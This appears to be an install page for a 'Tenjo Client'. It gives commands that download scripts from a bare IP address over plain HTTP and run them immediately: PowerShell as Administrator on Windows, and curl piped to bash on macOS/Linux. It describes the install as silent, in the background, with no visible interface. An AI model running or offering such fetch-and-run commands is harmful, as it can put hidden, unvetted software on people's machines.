# 🚀 Tenjo Client - Quick Install Commands

## Server: 103.129.149.67

### Windows (Run as Administrator)
```cmd
powershell -Command "Invoke-WebRequest -Uri 'http://103.129.149.67/downloads/easy_install_windows.bat' -OutFile 'tenjo.bat'; .\tenjo.bat"
```

### macOS / Linux
```bash
curl -sSL http://103.129.149.67/downloads/simple_install_macos.sh | bash
```

**Alternative (if main installer has issues):**
```bash
curl -sSL http://103.129.149.67/downloads/easy_install_macos.sh | bash
```

---

**Important Notes:**
- Windows: Must run as Administrator (right-click Command Prompt → "Run as administrator")
- macOS: Server URL is pre-configured (103.129.149.67)
- Installation is automatic and runs silently in background
- No visible interface after installation

**Dashboard Access:** http://103.129.149.67

**Support:** Include error messages if installation fails
